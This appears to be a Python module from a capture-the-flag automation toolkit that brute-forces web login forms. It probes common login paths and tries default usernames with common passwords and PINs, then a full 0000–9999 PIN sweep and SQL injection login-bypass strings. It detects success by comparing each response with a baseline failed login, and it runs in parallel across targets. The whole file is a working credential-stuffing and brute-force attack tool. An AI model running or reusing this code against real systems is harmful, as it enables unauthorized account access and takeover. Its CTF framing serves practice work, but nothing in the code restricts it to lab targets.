"""Login brute force — the THCTT 2021 'WebAccessControl' pattern (4-digit PIN
on a default username) plus generic credential stuffing. Finds login forms /
common JSON login endpoints, tries common credentials, then numeric PINs when
the page hints at one. Success is detected by comparing against a baseline
failed login (status / body fingerprint / flag presence)."""
import html as html_mod
import json
import os
import re
import urllib.parse

from core import httpx
from core.flag import extract_flags
from core.parallel import pmap

# common usernames tried against every login target
USERNAMES = ["admin", "Admin", "administrator", "root", "NCSA", "ncsa", "user",
             "test", "guest", "ctf", "flag", "operator", "service", "system",
             "superadmin", "support", "webadmin", "manager"]

# password candidates used first (cheap, high hit rate)
COMMON_PASSWORDS = ["admin", "password", "123456", "12345678", "1234", "12345",
                    "1234567", "123456789", "password1", "qwerty", "letmein",
                    "admin123", "root", "toor", "test", "guest", "welcome",
                    "welcome1", "changeme", "secret", "NCSA", "ncsa", "7331",
                    "ctf", "flag", "redacted", "thailand", "thai1234"]

# 4-digit pins that show up in CTF challenges disproportionately often
COMMON_PINS = ["0000", "1111", "1234", "1337", "4321", "1122", "2222", "3333",
               "4444", "5555", "6666", "7777", "8888", "9999", "2001", "2020",
               "2021", "2022", "2023", "2024", "2025", "6969", "8008", "0815",
               "7331", "1776", "1984", "1230", "1024", "2048", "31337", "0007",
               "4242", "12345", "1001", "1212", "6789", "9876", "3141", "2718"]

LOGIN_PATHS = ["/login", "/signin", "/sign-in", "/admin", "/admin/login",
               "/administrator", "/auth", "/authenticate", "/user/login",
               "/account/login", "/api/login", "/api/auth", "/api/authenticate",
               "/api/signin", "/api/v1/login", "/api/user/login", "/logon",
               "/wp-login.php", "/index.php/login"]

PIN_HINT_RE = re.compile(r"(?i)(4[\s-]?digit|pin|passcode|pass[\s-]?code|otp)")


def _field_info(field):
    """Normalize legacy ``(name, type)`` and value-aware field tuples."""
    name = field[0]
    field_type = field[1] if len(field) > 1 else ""
    value = field[2] if len(field) > 2 else ""
    return name, (field_type or "").lower(), value


def _load_wordlist_passwords():
    words = []
    try:
        base = os.path.dirname(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))))
        path = os.path.join(base, "wordlists", "passwords.txt")
        if os.path.exists(path):
            with open(path, encoding="utf-8", errors="replace") as fh:
                words = [w.strip() for w in fh if w.strip() and len(w.strip()) <= 32]
    except Exception:
        pass
    return words


def _find_login_forms(base, page_html):
    """Return (target, [(fieldname, is_password)], method) for login forms."""
    parsed = urllib.parse.urlparse(base)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    forms = []
    for fm in re.finditer(r"<form[^>]*>(.*?)</form>", page_html, re.I | re.S):
        block = fm.group(0)
        if "password" not in block.lower() and "pass" not in block.lower():
            continue
        am = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"']", block, re.I)
        action = am.group(1) if am else ""
        if action.startswith("http"):
            target = action
        else:
            target = urllib.parse.urljoin(origin + parsed.path, action)
        mm = re.search(r"<form[^>]*method=[\"']([^\"']*)[\"']", block, re.I)
        method = (mm.group(1) if mm else "post").lower()
        fields = []
        for tag_match in re.finditer(
                r"<(?:input|textarea)\b[^>]*>", block, re.I | re.S):
            tag = tag_match.group(0)
            nm = re.search(r"\bname=[\"']([^\"']+)[\"']", tag, re.I)
            if not nm:
                continue
            n = html_mod.unescape(nm.group(1))
            tm = re.search(r"\btype=[\"']([^\"']*)[\"']", tag, re.I)
            ftype = (tm.group(1) if tm else
                     ("textarea" if tag.lower().startswith("<textarea") else "text")).lower()
            vm = re.search(r"\bvalue=[\"']([^\"']*)[\"']", tag, re.I)
            fields.append((n, ftype,
                           html_mod.unescape(vm.group(1)) if vm else ""))
        if fields:
            forms.append((target, fields, method))
    return forms


def _baseline_fail(target, fields, method):
    """One clearly-wrong login to fingerprint the failure shape."""
    data = {}
    for field in fields:
        name, field_type, value = _field_info(field)
        data[name] = value if field_type in ("hidden", "submit") else \
            "___definitely_wrong___"
    if method == "get":
        qs = urllib.parse.urlencode(data)
        r = httpx.get(target + ("&" if "?" in target else "?") + qs, timeout=8)
    else:
        r = httpx.post(target, data=data, timeout=8)
    return r


def _is_success(r, base_fp, flags):
    if r is None or flags:
        return bool(flags)
    if r.status in (401, 403, 404):
        return False
    if base_fp is None:
        return False
    bstatus, blen, bbody = base_fp
    if r.status in (302, 303) and bstatus not in (302, 303):
        return True  # redirect after successful login
    if r.status != bstatus:
        return r.status in (200, 201)
    # same status: body must differ meaningfully (lenient 15% delta)
    delta = abs(len(r.body) - blen)
    if blen > 0 and delta > max(40, blen * 0.15):
        return True
    low = r.text.lower()
    if any(w in low for w in ("invalid", "incorrect", "wrong", "failed",
                              "denied", "unauthorized", "not found")):
        return False
    if "welcome" in low or "success" in low or "logged in" in low:
        return True
    return False


def _try_creds(target, fields, method, creds, baseline, findings, flags,
               cap=None):
    """Try a list of (user, pass) tuples; return True if a success was found
    (so the caller can stop)."""
    count = 0
    for user, pwd in creds:
        count += 1
        if cap and count > cap:
            break
        data = {}
        pw_field = None
        for field in fields:
            n, t, value = _field_info(field)
            if t in ("hidden", "submit"):
                data[n] = value
                continue
            if t == "password":
                data[n] = pwd
                pw_field = n
            elif t in ("text", "email", "username", "user", "login", "") or \
                    "user" in n or "login" in n or "email" in n or "name" in n:
                data[n] = user
            else:
                data[n] = user
        if pw_field is None:
            # no explicit password field detected; assume last field
            for field in reversed(fields):
                n, t, _value = _field_info(field)
                data[n] = pwd
                break
        if method == "get":
            qs = urllib.parse.urlencode(data)
            r = httpx.get(target + ("&" if "?" in target else "?") + qs,
                          timeout=8)
        else:
            r = httpx.post(target, data=data, timeout=8)
        known, cands = extract_flags(r.text) if r else ([], [])
        new_flags = known + cands
        if _is_success(r, baseline, new_flags):
            findings.append(
                f"  [!] login {target} → สำเร็จด้วย {user!r}:{pwd!r} "
                f"(HTTP {r.status if r else '?'})")
            flags.extend(new_flags)
            return True
    return False


def run_login_brute(base, page_html, full_pin=False, workers=16):
    """Brute-force login forms found in the page + common login endpoints.
    Returns (findings, flags)."""
    findings = []
    flags = []
    targets = []  # (target_url, fields, method, pin_hint)

    for target, fields, method in _find_login_forms(base, page_html):
        targets.append((target, fields, method))
    # probe common login endpoints ONLY if no form found on homepage
    probed = set()
    if not targets:  # only probe if we didn't find a form already
        for p in LOGIN_PATHS:
            url = base + p
            r = httpx.get(url, timeout=6)
            if r is None or r.status in (404, 500):
                continue
            forms = _find_login_forms(base + p, r.text)
            if forms:
                for f in forms:
                    if f[0] not in probed:
                        probed.add(f[0])
                        targets.append(f)
            elif r.status == 200 and ("password" in r.text.lower() or
                                      "login" in r.text.lower()):
                probed.add(url)
                targets.append((url, [("username", "text"), ("password", "password")], "post"))

    if not targets:
        return findings, flags

    def do(t):
        target, fields, method = t
        local_find = []
        local_flags = []
        baseline = _baseline_fail(target, fields, method)
        base_fp = None
        if baseline is not None:
            base_fp = (baseline.status, len(baseline.body), baseline.text)
        hint = PIN_HINT_RE.search(target) or (
            baseline and PIN_HINT_RE.search(baseline.text))
        creds = []
        # top combos first: admin×common + common×admin
        for p in COMMON_PASSWORDS[:15]:
            creds.append(("admin", p))
        for u in USERNAMES[:5]:
            creds.append((u, "admin"))
            creds.append((u, "password"))
        # default-username × top pins
        if hint or full_pin:
            for pin in COMMON_PINS:
                creds.append(("admin", pin))
        # SQL injection payloads on login form
        for sqli_user in ["' OR 1=1 --", "admin' OR '1'='1", "' OR '1'='1' --",
                          "admin' --", "' OR ''='"]:
            creds.append((sqli_user, "anything"))
        # wordlist passwords (limited for speed)
        wordlist = _load_wordlist_passwords()
        for p in wordlist[:30]:
            creds.append(("admin", p))
        if _try_creds(target, fields, method, creds, base_fp,
                      local_find, local_flags):
            return local_find, local_flags
        # explicit 4-digit brute: page hinted at a PIN or --full-pin passed
        if full_pin or (hint and "digit" in (hint.group(1) or "").lower()):
            pins = [(f"{i:04d}") for i in range(10000)]
            for u in ("admin", "NCSA", "ncsa", "root"):
                if _try_creds(target, fields, method,
                              [(u, p) for p in pins], base_fp,
                              local_find, local_flags):
                    break
        return local_find, local_flags

    for _, res in pmap(do, targets, workers=workers, desc="login brute"):
        if isinstance(res, Exception):
            continue
        find, fl = res
        findings.extend(find)
        flags.extend(fl)
    return list(dict.fromkeys(findings)), list(dict.fromkeys(flags))
